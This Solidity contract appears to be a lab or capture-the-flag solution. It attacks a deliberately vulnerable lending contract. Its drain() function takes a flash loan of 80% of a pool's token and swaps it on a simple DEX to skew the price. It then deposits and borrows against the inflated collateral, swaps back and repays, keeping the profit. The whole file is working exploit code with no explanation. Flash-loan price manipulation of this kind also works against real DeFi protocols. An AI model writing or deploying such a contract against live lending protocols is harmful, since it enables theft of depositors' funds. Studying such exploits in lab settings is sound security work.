// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./VulnerableLender.sol";
import "./FlashLoanPool.sol";
import "./SimpleDEX.sol";

import "hardhat/console.sol";

contract C1 {
	VulnerableLender public lender;
	FlashLoanPool public flashLoanPool;
	SimpleDEX public dex;
	IERC20 public tokenA;
	IERC20 public tokenB;

	constructor(address _tokenA, address _tokenB, address _flashLoanPool, address _dex, address _lender) {
		tokenA = IERC20(_tokenA);
		tokenB = IERC20(_tokenB);
		flashLoanPool = FlashLoanPool(_flashLoanPool);
		dex = SimpleDEX(_dex);
		lender = VulnerableLender(_lender);
	}

	function drain() public {
		uint256 totalPoolTokenB = tokenB.balanceOf(address(flashLoanPool));
		uint256 amount = (totalPoolTokenB * 80) / 100;

		flashLoanPool.flashLoan(address(tokenB), amount, "0x0");
	}

	function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
		tokenB.approve(address(dex), amount);
		dex.swap(address(tokenB), amount);
		
		uint256 depositTokenA = tokenA.balanceOf(address(this)) / 2;
		tokenA.approve(address(lender), depositTokenA);
		lender.depositAndBorrow(depositTokenA);

		uint256 remainingTokenA = tokenA.balanceOf(address(this));
		tokenA.approve(address(dex), remainingTokenA);
		dex.swap(address(tokenA), remainingTokenA);

		tokenB.transfer(address(flashLoanPool), amount);
	}
}
